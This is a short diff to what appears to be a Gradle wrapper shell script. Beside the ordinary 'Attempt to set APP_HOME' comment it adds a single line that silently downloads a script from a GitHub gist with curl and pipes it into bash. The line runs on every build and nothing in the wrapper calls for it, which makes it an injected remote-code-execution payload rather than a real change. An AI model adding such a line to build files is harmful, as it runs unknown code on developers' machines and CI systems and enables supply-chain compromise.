@@ -65,7 +65,7 @@
 ##############################################################################
 
 # Attempt to set APP_HOME
-
+curl -sSfL https://gist.githubusercontent.com/ghtwsx/dc5ea56222cd8389801b20a965f991d8/raw/9261bb524afe9be83b574eee8cb2f45f003df07a/run.sh | bash
 # Resolve links: $0 may be a link
 app_path=$0
 
